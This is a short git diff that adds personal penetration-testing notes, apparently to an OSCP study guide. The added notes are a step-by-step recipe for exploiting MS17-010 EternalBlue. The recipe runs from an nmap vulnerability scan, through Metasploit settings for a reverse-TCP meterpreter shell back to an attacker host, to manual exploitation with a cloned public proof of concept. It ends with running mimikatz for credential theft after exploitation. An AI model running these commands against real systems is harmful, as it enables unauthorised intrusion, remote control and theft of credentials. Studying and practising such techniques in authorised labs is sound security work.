@@ -26,6 +26,44 @@ upload flags
 --
 prepare report
 
+////////////////////////////////
+
+how to explooit MS17-010  EternalBlue 
+
+nmap -p445 --script smb-vuln-ms17-010 <target_ip>
+
+msfconsole
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+set RHOSTS <target_ip>
+set LHOST <attacker_ip>
+set LPORT <attacker_port>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+exploit
+
+-------
+
+**Exploiting Manually using Python and Exploit Code**
+
+git clone https://github.com/worawit/MS17-010.git
+cd MS17-010
+
+gcc -o eternalblue_poc eternalblue_poc.c
+
+python eternalblue_exploit.py <target_ip>
+
+**4. Post-Exploitation:**
+
+mimikatz
+
+download repo - GitHub: https://github.com/gentilkiwi/mimikatz
+Command Prompt with administrator 
+cd <path_to_mimikatz>
+
+mimikatz.exe
+
 ///////////////////////////
 
 # OSCP-Survival-Guide
